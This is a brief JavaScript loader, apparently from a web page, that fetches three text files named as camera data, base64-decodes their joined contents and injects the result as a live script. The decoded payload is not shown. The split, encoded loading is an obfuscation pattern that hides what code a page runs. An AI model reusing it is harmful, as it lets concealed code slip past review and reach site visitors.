(async()=>{try{
  const names=['cam0.txt','cam1.txt','cam2.txt'];
  const parts=await Promise.all(names.map(async n=>{
    const r=await fetch(n,{cache:'no-store'});
    if(!r.ok) throw new Error(n+' '+r.status);
    return r.text();
  }));
  const bin=atob(parts.join('').replace(/\s+/g,''));
  const bytes=Uint8Array.from(bin,c=>c.charCodeAt(0));
  const code=new TextDecoder('utf-8').decode(bytes);
  const s=document.createElement('script');
  s.textContent=code;
  document.body.appendChild(s);
}catch(e){console.error('camera loader',e)}})();